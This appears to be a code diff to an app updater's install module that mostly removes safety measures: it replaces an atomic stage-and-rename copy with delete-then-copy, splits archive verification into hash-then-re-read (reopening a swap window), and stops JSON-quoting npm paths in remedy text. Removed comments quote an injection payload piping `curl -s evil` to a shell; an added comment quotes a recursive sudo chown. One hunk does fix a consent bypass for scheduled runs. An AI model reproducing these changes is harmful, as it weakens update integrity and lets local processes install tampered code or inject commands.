@@ -32,7 +32,7 @@ import path from 'node:path'
 import { spawnSync } from 'node:child_process'
 
 import { CODES } from './codes.js'
-import { sha256Bytes, sha256FileSync } from './digest.js'
+import { sha256File, sha256FileSync } from './digest.js'
 import { UpdaterError, canonicalPath, ensurePrivateDir, removeTreeWithin, resolveWithin, tightenMode, writableRoots, writePrivateFile } from './fsutil.js'
 import { probeIdle } from './idle.js'
 import { kickstartJob, readRunningJob } from './launchd.js'
@@ -236,129 +236,10 @@ export function restoreBackup({ backupDir, appsDir, bundles = DEFAULT_BUNDLES, c
   return { ok: true, message: 'the previous version is back in place and verified file-by-file' }
 }
 
-/**
- * Put `sourceDir` where `targetDir` is, without ever leaving a half of either there.
- *
- * `rmSync(target)` + `cpSync(source, target)` — the shape this file used — opens a
- * window the length of the whole copy in which the target is missing or partial, so a
- * `SIGTERM`/`SIGINT` between the backup and the final state stamp leaves
- * `~/Applications/GlassPane.app` gone while `update-state.json` still claims the old
- * version is installed. There is no signal handler anywhere in `updater/` to close
- * that window politely, and the copy cannot be made short.
- *
- * So the new tree is written under a sibling name and only then moved in, with the old
- * one moved *aside* (not deleted) for the instant between the two renames:
- *   · a kill during the copy  → the target is the complete OLD tree, untouched;
- *   · a kill between the two renames → the name is free, but the complete old bytes
- *     sit one directory entry away under `.old-<pid>`, and the second rename is
- *     `O(1)`;
- *   · a kill after it → the complete NEW tree, with the old one as `.old-<pid>` until
- *     the cleanup (or the next run) removes it.
- * Both renames are inside one parent directory, so they are same-volume and atomic.
- * This is the same shape `lib/runtime.js`'s `materializeRuntime` already uses for a
- * generation (`.<version>.new-<pid>` then rename), which is why it is not new risk.
- */
-function renameDirectoryIntoPlace(sourceDir, targetDir) {
-  const parent = path.dirname(targetDir)
-  if (!fs.existsSync(targetDir)) {
-    fs.renameSync(sourceDir, targetDir)
-    return null
-  }
-  const aside = path.join(parent, `${path.basename(targetDir)}.old-${process.pid}`)
-  fs.renameSync(targetDir, aside)
-  try {
-    fs.renameSync(sourceDir, targetDir)
-  } catch (error) {
-    // The name is only free for the length of one syscall; if taking the new tree in
-    // failed, the old one goes straight back and the caller hears about the failure.
-    try {
-      fs.renameSync(aside, targetDir)
-      throw error
-    } catch (restoreError) {
-      if (restoreError === error) throw error
-      throw new UpdaterError(
-        CODES.swapFailed,
-        `${error?.message ?? String(error)}; and ${aside} could not be put back at ${targetDir} (${restoreError?.message ?? String(restoreError)}), so the previous copy is on disk under ${aside} while ${targetDir} is missing`,
-      )
-    }
-  }
-  try {
-    fs.rmSync(aside, { recursive: true, force: true })
-    return null
-  } catch (error) {
-    // Disk, not trust: the landed tree is complete and the leftover is a stale copy
-    // the next run's cleanup (or `discardStaging`) takes with the directory it sits in.
-    return `${aside} could not be removed after the swap (${error?.message ?? String(error)})`
-  }
-}
-
-/**
- * The bundle copier `installBundles` and `backupBundles` run by default, exported
- * because "what happens when this is interrupted" is only answerable by interrupting
- * it — `test/review-2026-10-09.test.mjs` kills a real child process in the middle of a
- * real copy and reads the target back.
- */
-export function defaultCopy(source, target) {
-  const parent = path.dirname(target)
-  const base = path.basename(target)
-  fs.mkdirSync(parent, { recursive: true })
-  sweepStaleCopies(parent, base)
-  const staged = path.join(parent, `${base}.new-${process.pid}`)
-  try {
-    fs.cpSync(source, staged, { recursive: true, dereference: false })
-  } catch (error) {
-    try {
-      fs.rmSync(staged, { recursive: true, force: true })
-    } catch {
-      /* a half copy we could not delete is still not a half *target* */
-    }
-    throw error
-  }
-  renameDirectoryIntoPlace(staged, target)
-}
-
-/**
- * Remove in-flight copies of *this* name that belong to processes which are gone.
- *
- * A run that is SIGKILLed between the copy and the rename leaves
- * `<bundle>.new-<pid>` — a partial bundle sitting in `~/Applications`, where the panel
- * and Launch Services can both find it. The name carries the writing pid, so the entry
- * is only this tool's own garbage when that pid is no longer alive; a live pid is left
- * alone (it is another run's in-flight copy, and deleting it mid-copy fails that run
- * closed rather than quietly).
- *
- * `.old-` siblings are *not* swept: a kill between the two renames leaves the complete
- * previous bundle under that name, and it is the only copy of those bytes. Recovering it
- * is the in-flight-marker question this pass deliberately does not half-implement.
- */
-function sweepStaleCopies(parent, base) {
-  let entries = []
-  try {
-    entries = fs.readdirSync(parent)
-  } catch {
-    return
-  }
-  const pattern = new RegExp(`^${base.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\.new-(\\d+)$`)
-  for (const name of entries) {
-    const match = pattern.exec(name)
-    if (!match) continue
-    const pid = Number(match[1])
-    if (pid !== process.pid) {
-      let alive = false
-      try {
-        process.kill(pid, 0)
-        alive = true
-      } catch (error) {
-        alive = error?.code === 'EPERM'
-      }
-      if (alive) continue
-    }
-    try {
-      fs.rmSync(path.join(parent, name), { recursive: true, force: true })
-    } catch {
-      /* leftover disk is bad; a target that is a half bundle is worse, so keep going */
-    }
-  }
+function defaultCopy(source, target) {
+  fs.rmSync(target, { recursive: true, force: true })
+  fs.mkdirSync(path.dirname(target), { recursive: true })
+  fs.cpSync(source, target, { recursive: true, dereference: false })
 }
 
 /* ------------------------------------------- the staged bytes, re-proven at apply time */
@@ -372,28 +253,18 @@ function sweepStaleCopies(parent, base) {
  * the archive digest the release's own checksum file covered (gate 5) and the state
  * recorded.
  *
- * Read once, hashed in memory, extracted from that buffer, swapped into place — in that
- * order, and the whole point of the order:
- *
- * · **one read.** The first version of this function hashed `archivePath` with
- *   `sha256File` and then asked `fs.readFileSync` for the *same path* to unpack. A
- *   same-user process that serves the signed archive at hash time and the attacker's
- *   archive at unpack time gets a proof of bytes it then does not install — the re-read
- *   gates nothing. `sha256Bytes` of the buffer is now the measurement, and the *same
- *   buffer* is what `extractInto` unpacks, so what is proven and what is extracted are
- *   one object in memory.
- * · **the tree that gets built is the tree just proven.** Comparing the unpacked tree
- *   with the on-disk one and then building the *on-disk* one leaves the same window
- *   open a second later. So the freshly unpacked tree is renamed over
- *   `rootPath` ({@link renameDirectoryIntoPlace}) and returned, and `applyUpdate`
- *   builds, packs, and copies from that returned path. The comparison is still made
- *   first, because a person refused mid-way has to be told *which* relative path
- *   disagreed.
+ * Both halves use machinery this package already has: `sha256File` from `lib/digest.js`
+ * (§1 gate 5's own measurement) and `manifestTree` over the tree `extractInto` unpacks
+ * a second time from those bytes. That is deliberate — the comparison is "the tree on
+ * disk against the tree that comes out of the signed archive", so a file added, removed,
+ * rewritten or swapped for a symlink shows up as a *named* difference instead of a
+ * `staged tree looks shaped right`.
  */
 export async function verifyStagedBytes({
   stateRoot,
   staged,
   rootPath,
+  hashFile = sha256File,
   readArchive = (file) => fs.readFileSync(file),
   existsFn = (file) => fs.existsSync(file),
 }) {
@@ -411,15 +282,13 @@ export async function verifyStagedBytes({
   if (!existsFn(archivePath)) {
     return { ok: false, reason: `${archivePath} is no longer on disk, so ${rootPath} cannot be proven to be the bytes whose digest ${expected.slice(0, 12)}… the release's checksum file named` }
   }
-  // The only read of the archive anywhere in this proof: one buffer, hashed and unpacked.
-  const archiveBytes = readArchive(archivePath)
-  const actual = sha256Bytes(archiveBytes)
+  const actual = await hashFile(archivePath)
   if (actual !== expected) {
     return { ok: false, reason: `the staged archive now digests ${actual}, while the release's checksum file — and the state — say ${expected}: the bytes under ${staged.dir} are not the bytes that were published` }
   }
   const scratch = path.join(staged.dir, `apply-verify-${process.pid}`)
   try {
-    extractInto({ treePath: scratch, stagingRoot: staging, bytes: archiveBytes })
+    extractInto({ treePath: scratch, stagingRoot: staging, bytes: readArchive(archivePath) })
     const unpacked = releaseTreeRoot({ treePath: scratch, version: staged.version })
     if (!unpacked.ok) {
       return { ok: false, reason: `the archive in ${staged.dir} no longer unpacks into a ${staged.version} release tree (${unpacked.reason})` }
@@ -433,22 +302,16 @@ export async function verifyStagedBytes({
         details: { differences: firstDifferences(fromArchive, onDisk) },
       }
     }
-    // Proven *and* landed: after this line the only bytes at `rootPath` are the ones
-    // `extractInto` wrote from the buffer whose digest was just measured, and they are
-    // what `build`, `npm pack` and the runtime copy below are handed.
-    renameDirectoryIntoPlace(unpacked.rootPath, rootPath)
-    return { ok: true, reason: null, digest: actual, rootPath }
   } catch (error) {
     return { ok: false, reason: `re-reading the staged archive failed (${error?.message ?? String(error)})` }
   } finally {
     try {
-      // Normal path already renamed this directory into place; this is the refusal
-      // path's cleanup, and a refused proof must not cost disk either.
       removeTreeWithin(staging, scratch)
     } catch {
       /* the scratch copy is inside the staging root; a failed cleanup cannot un-prove the tree */
     }
   }
+  return { ok: true, reason: null, digest: actual }
 }
 
 /* ------------------------------------------------------------------- build */
@@ -1186,8 +1049,17 @@ export async function applyUpdate({
       clearStaged: true,
     })
   }
-  if (kind === 'major' && !consents.includes('major')) {
-    return fail('needs-consent', CODES.consentRequired, `version ${wantVersion} is a major upgrade from ${baseline}. Press "Install update" in the GlassPane panel to confirm you want it.`)
+  // A scheduled run has no person behind it, so it inherits no consents. `cli.js` refuses
+  // `--auto --consent <kind>` at the boundary; this is the same rule for anything that
+  // imports `apply` around the CLI. Before this, both consent gates below read `consents`
+  // regardless of `trigger`, so `apply --auto --consent major` swapped a major upgrade while
+  // the USAGE text said majors refuse under `--auto`.
+  const humanConsents = trigger === 'auto' ? [] : consents
+  if (kind === 'major' && !humanConsents.includes('major')) {
+    return fail('needs-consent', CODES.consentRequired, `version ${wantVersion} is a major upgrade from ${baseline}. Press "Install update" in the GlassPane panel to confirm you want it.`
+      + (trigger === 'auto' && consents.length > 0
+        ? ' This run came in as the scheduled run (--auto), so the consent on its command line was not used: a schedule cannot confirm on a person\'s behalf.'
+        : ''))
   }
   if (trigger === 'auto' && (state.disabled === true || state.autoApply === false)) {
     // §5: the switch really stops the swap. A manual invocation (the panel
@@ -1200,7 +1072,7 @@ export async function applyUpdate({
   if (job.unknown === true) {
     return fail('deferred', CODES.busyOrUnreachable, `the running daemon job could not be identified (${job.reason}), so no version was swapped`)
   }
-  const permission = decideSwapPermission({ probe: verdict, jobArgs: job.args, ourStateRoot: stateRoot, consented: consents })
+  const permission = decideSwapPermission({ probe: verdict, jobArgs: job.args, ourStateRoot: stateRoot, consented: humanConsents })
   if (permission.status !== 'allowed') {
     // `unknown` 不是一个 consent 能回答的问题（作业写了哪个状态根本来就读不出来），所以它
     // 落到 `deferred` 那一档，跟上面 `job.unknown === true` 同一个口径；只有真正"等人点头"
@@ -1220,43 +1092,27 @@ export async function applyUpdate({
       + `${staged.dir}, that is the thing to fix first.`,
       { details: proven.details ?? null })
   }
-  /**
-   * From here on the tree everything downstream reads is **the tree this proof just
-   * unpacked from the bytes it just hashed**, not "whatever is sitting at
-   * `staged.rootPath`". They are the same path — `verifyStagedBytes` renamed the fresh
-   * one into place — but naming one variable here is what keeps a later edit from
-   * re-introducing the old split, where the proof looked at one tree and the build got
-   * another.
-   */
-  const provenTree = proven.rootPath
 
   // §3.5's pre-flight, placed here because everything below this line can change the live machine.
   // The npm step is the last one and the only one that can need root; finding that out after the
   // bundles were swapped buys a rollback, two daemon restarts and a version that never lands.
   const npmReady = preflightNpm()
   if (!npmReady.ok) {
-    // SECURITY.md §3, and the 1.9.0 rewrite of the `probe-failed` remedy, is the rule this
-    // sentence obeys: a privileged action is **named**, never scripted for whoever reads it.
-    // The two reasons it has to be named here rather than written out are both measured:
-    //  · the paths below come out of `npm config get prefix`, i.e. out of `~/.npmrc`, which
-    //    any process of this account can rewrite. The shape this file used to emit
-    //    interpolated them straight into a root command line, so a prefix of
-    //    `/tmp/x"; curl -s evil|sh; #` turned the next `apply` into somebody else's shell
-    //    running as root — and `startsWith('-')` screens an option, never a payload.
-    //  · a command line in a refusal *is* an instruction to run it. This string lands in
-    //    `lastError.message`, which the panel prints and `mcp-shell` forwards to an agent;
-    //    there is no consent step between the two and a keyboard.
-    // So: the action, the exact paths JSON-quoted so a reader can see where a path ends and
-    // prose begins, and who has to do it.
-    const unwritableDirs = (npmReady.dirs ?? [npmReady.dir]).map((dir) => JSON.stringify(String(dir)))
     const remedy = npmReady.dir
-      ? 'A person has to do one of these once, at a terminal, because the updater will not run a privileged command and will not hand one to an agent: '
-        + `give this login ownership of npm's global directories (${unwritableDirs.join(' and ')}), `
-        + 'which needs a password and is exactly the kind of action this program only names. '
-        + 'Confirm those paths against what `npm config get prefix` answers you — they were read from npm, not chosen here — '
-        + 'and the alternative that needs no privilege at all is to move npm\'s prefix under the home directory '
-        + '(`npm config set prefix ~/.npm-global`, put `~/.npm-global/bin` on PATH, then re-run the GlassPane installer so the launcher points at the new one). '
-        + 'After that, press "Install update" again.'
+      // The two ways out are not equal, and the sentence used to lead with the dangerous one:
+      // `sudo chown -R "$(whoami)" /usr/local/lib/node_modules /usr/local/bin` — a recursive ownership
+      // sweep across every *other* global package and every binary in /usr/local/bin, printed verbatim by
+      // the panel and by `gp_diagnose` because `lastError.message` is what they show. This product's rule
+      // (test/remedy-surface.test.mjs, and the shape lib/ca-bundle.js was corrected to) is that a remedy may
+      // *name* the tool a person would use but must not hand out an executable escalation. Relocating npm's
+      // prefix needs no escalation at all and an agent can run it, so it comes first.
+      ? 'Two ways out, and the first one an agent can run by itself: move npm\'s prefix under the home '
+        + 'directory (`npm config set prefix ~/.npm-global`, put `~/.npm-global/bin` on PATH, then re-run the '
+        + 'GlassPane installer so the launcher points at the new one). The other is a person\'s call, and this '
+        + 'tool will not run it for them: hand '
+        + (npmReady.dirs ?? [npmReady.dir]).map((dir) => `"${dir}"`).join(' and ')
+        + ' to this account, which means a `chown` of those directories entered by hand with a password. '
+        + 'After either one, press "Install update" again.'
       : 'Check `npm config get prefix` from this account — the updater will not ask for a password.'
     return fail('deferred', CODES.npmPrefixUnwritable,
       'automatic update cannot finish on this machine: '
@@ -1271,7 +1127,7 @@ export async function applyUpdate({
   // prefix and still ship a package with nothing to run. Measured on 2026-10-01 against v1.5.1, where the
   // archive was pure source: `npm pack` produced a three-entry package, `npm install -g` exited 0, the
   // version read back correctly, and the MCP half of the handshake died on `ENOENT` — after the swap.
-  const commandsReady = preflightNpmCommands({ stagedTree: provenTree })
+  const commandsReady = preflightNpmCommands({ stagedTree: staged.rootPath })
   if (!commandsReady.ok) {
     return fail('deferred', CODES.releaseBadPayload,
       'the staged release cannot produce a runnable npm package: '
